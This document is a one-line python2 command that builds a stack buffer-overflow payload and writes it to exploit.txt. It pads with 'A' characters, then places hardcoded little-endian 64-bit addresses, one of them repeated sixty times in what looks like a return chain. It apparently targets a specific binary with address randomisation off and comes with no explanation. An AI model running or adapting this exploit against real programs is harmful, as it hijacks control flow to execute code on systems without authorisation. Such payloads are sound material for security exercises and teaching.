python2 -c 'print "A" * (400 - (96 + 8)) + "\x00\x00\x7f\xff\xf7\xe7\x7e\xd9"[::-1] + "\x00\x00\x7f\xff\xf7\xe9\x5c\x70"[::-1] * 60 + "\x00\x00\x7f\xff\xf7\xde\x88\x4d"[::-1]' > exploit.txt 